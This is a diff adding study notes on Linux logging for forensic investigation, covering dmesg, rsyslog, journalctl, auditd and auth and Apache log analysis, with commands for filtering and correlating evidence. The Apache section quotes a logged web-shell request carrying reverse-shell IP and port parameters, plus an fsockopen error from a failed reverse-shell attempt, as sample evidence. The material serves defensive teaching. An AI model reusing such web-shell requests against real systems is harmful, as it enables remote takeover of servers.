@@ -1,0 +1,411 @@
+LINUX LOGGING 
+
+⸻
+
+1. LOGGING ARCHITECTURE OVERVIEW
+
+Linux logging is multi-layered, not a single system:
+
+Layer	Tool	Purpose
+Kernel	dmesg, kern.log	Hardware + core system
+System	syslog, rsyslog	General logging pipeline
+Journal	journalctl	Structured systemd logs
+Security	auditd	Fine-grained monitoring
+Auth	auth.log	Access + privilege
+Application	Apache logs	Entry point (attacks)
+
+
+⸻
+
+2. KERNEL LOGGING (DEEP LEVEL)
+
+Sources
+	•	/var/log/kern.log
+	•	dmesg (ring buffer)
+
+Characteristics
+	•	Volatile (ring buffer overwritten)
+	•	Persistent copy via rsyslog
+
+⸻
+
+Advanced Commands
+
+Filter by keyword
+
+dmesg | grep -i "error"
+
+Human-readable timestamps
+
+dmesg -T
+
+Live monitoring
+
+dmesg -w
+
+
+⸻
+
+Example + Deep Analysis
+
+custom_kernel: loading out-of-tree module taints kernel
+
+	•	out-of-tree → not official
+	•	taints → disables trust model
+
+→ Kernel integrity broken
+
+⸻
+
+3. SYSLOG / RSYSLOG (PIPELINE CONTROL)
+
+Config Files
+
+/etc/rsyslog.conf
+/etc/rsyslog.d/*.conf
+
+
+⸻
+
+Example Rule
+
+auth,authpriv.*   /var/log/auth.log
+kern.*            /var/log/kern.log
+*.*;auth.none     /var/log/syslog
+
+Meaning
+	•	Facility + severity routing
+	•	Controls where logs go
+
+⸻
+
+Advanced Concepts
+
+Facility + Severity
+
+facility.level
+
+Example:
+
+auth.warning
+kern.err
+
+
+⸻
+
+Log Forwarding (SIEM)
+
+*.* @@192.168.1.100:514
+
+	•	@@ → TCP forwarding
+	•	Sends logs to central server
+
+⸻
+
+4. JOURNALCTL (STRUCTURED ANALYSIS)
+
+Key Strength
+	•	Indexed logs
+	•	Fast filtering
+	•	Combines all sources
+
+⸻
+
+Core Parameters (IMPORTANT)
+
+Time Filtering
+
+journalctl -S "2024-06-01" -U "2024-06-02"
+
+Relative Time
+
+journalctl -S "1 hour ago"
+
+
+⸻
+
+Boot Analysis
+
+journalctl -b        # current boot
+journalctl -b -1     # previous boot
+
+
+⸻
+
+Service Filtering
+
+journalctl -u ssh.service
+
+
+⸻
+
+Priority Filtering
+
+journalctl -p err
+journalctl -p crit
+
+
+⸻
+
+Kernel Logs Only
+
+journalctl -k
+
+
+⸻
+
+Output Control
+
+journalctl -n 50
+journalctl -r
+journalctl --no-pager
+
+
+⸻
+
+Example + Analysis
+
+sudo[77794]: auth could not identify password for [www-data]
+
+→ Web service attempting privilege escalation
+
+⸻
+
+Storage Modes
+
+/etc/systemd/journald.conf
+
+Options:
+	•	Storage=volatile → RAM only
+	•	Storage=persistent → disk
+
+⸻
+
+5. AUDITD (FORENSIC-GRADE LOGGING)
+
+Components
+	•	auditd → daemon
+	•	auditctl → rule creation
+	•	ausearch → query
+	•	aureport → summary
+
+⸻
+
+Rule Types
+
+File Monitoring
+
+auditctl -w /etc/passwd -p wra -k users
+
+Syscall Monitoring
+
+auditctl -a always,exit -F arch=b64 -S execve -k exec
+
+
+⸻
+
+Parameter Breakdown
+
+auditctl
+
+Flag	Meaning
+-w	watch file
+-p	permissions (r,w,x,a)
+-k	key/tag
+-a	action
+-F	filter
+-S	syscall
+
+
+⸻
+
+ausearch (IMPORTANT)
+
+Search by key
+
+ausearch -k users
+
+Human-readable output
+
+ausearch -i -k users
+
+Filter by time
+
+ausearch -ts today
+ausearch -ts 10:00 -te 12:00
+
+Filter by user
+
+ausearch -ua 1000
+
+Filter by command
+
+ausearch -x bash
+
+
+⸻
+
+Example Event
+
+type=SYSCALL comm="vim" exe="/usr/bin/vim"
+type=PATH name="/var/www/html/cmd.php"
+
+Interpretation
+	•	File accessed → web shell
+	•	Tool used → vim
+
+⸻
+
+aureport
+
+Summary Reports
+
+aureport -x   # commands executed
+aureport -u   # users
+aureport -f   # files
+
+
+⸻
+
+6. AUTH LOGS (ACCESS CONTROL)
+
+File
+
+/var/log/auth.log
+
+
+⸻
+
+Key Patterns
+
+Failed Login
+
+authentication failure user=root
+
+Successful Login
+
+Accepted password for root
+
+Sudo Execution
+
+COMMAND=/usr/bin/systemctl restart apache2
+
+
+⸻
+
+Advanced Filtering
+
+Brute Force Detection
+
+grep "Failed password" auth.log | wc -l
+
+Unique IPs
+
+grep "Failed password" auth.log | awk '{print $11}' | sort | uniq
+
+
+⸻
+
+7. APACHE APPLICATION LOGS (ENTRY POINT)
+
+Files
+
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+
+
+⸻
+
+Access Log Structure
+
+IP - - [TIME] "METHOD URL" STATUS SIZE "REFERRER" "USER-AGENT"
+
+
+⸻
+
+Example Attack
+
+GET /cmd.php?ip=10.10.24.106&port=5000 HTTP/1.1" 200
+
+Interpretation
+	•	Web shell accessed
+	•	Reverse shell parameters
+	•	Success (200)
+
+⸻
+
+Error Log Example
+
+fsockopen(): unable to connect to 10.10.x.x:5000
+
+→ Reverse shell attempt
+
+⸻
+
+Advanced Analysis
+
+Top IPs
+
+awk '{print $1}' access.log | sort | uniq -c | sort -nr
+
+Status Codes
+
+awk '{print $9}' access.log | sort | uniq -c
+
+
+⸻
+
+8. FULL ATTACK CORRELATION
+
+Stage	Log Source	Evidence
+Initial Access	Apache	/cmd.php
+Execution	auditd	execve
+Escalation	auth.log	sudo root
+Persistence	cron/syslog	scheduled tasks
+Deep Compromise	kern.log	kernel module
+
+
+⸻
+
+9. ADVANCED DFIR APPROACH
+
+Step-by-Step
+	1.	Start with application logs
+	•	Find entry point
+	2.	Move to auth logs
+	•	Check access + escalation
+	3.	Use auditd
+	•	Identify exact commands
+	4.	Check kernel logs
+	•	Detect rootkits
+	5.	Correlate timeline
+	•	Use timestamps across logs
+
+⸻
+
+10. FINAL CONCLUSION
+
+Findings
+	•	Web shell deployed (cmd.php)
+	•	Reverse shell attempts
+	•	Privilege escalation via sudo
+	•	Kernel module injection
+
+⸻
+
+Severity
+
+CRITICAL — FULL SYSTEM COMPROMISE
+
+⸻
+
+11. WHAT MAKES THIS ADVANCED (KEY DIFFERENCE)
+
+You are not just reading logs anymore. You are:
+	•	Using parameters to filter precisely
+	•	Understanding log flow (rsyslog → files)
+	•	Correlating multi-source evidence
+	•	Reconstructing attack chain
+
+⸻
+
